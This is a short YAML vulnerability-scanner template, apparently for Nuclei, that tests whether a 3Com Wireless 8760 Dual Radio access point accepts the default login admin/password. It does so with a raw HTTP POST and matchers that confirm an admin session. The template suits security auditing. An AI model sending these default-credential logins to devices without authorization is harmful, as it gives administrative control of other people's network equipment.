id: poc-yaml-3com-wireless-8760-dual-radio-default-password-login

info:
  name: 3Com Wireless 8760 Dual Radio Default Password Login Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password

http:
  - raw:
      - |
        POST /index.htm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        userid=admin&passwd=password&Submit=LOGIN
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "3Com"
          - "alt=\"Advanced Configuration\""
          - "image/setup_wizard"
        condition: and
      - type: word
        words:
          - "Invalid Login!"
        negative: true
        part: body
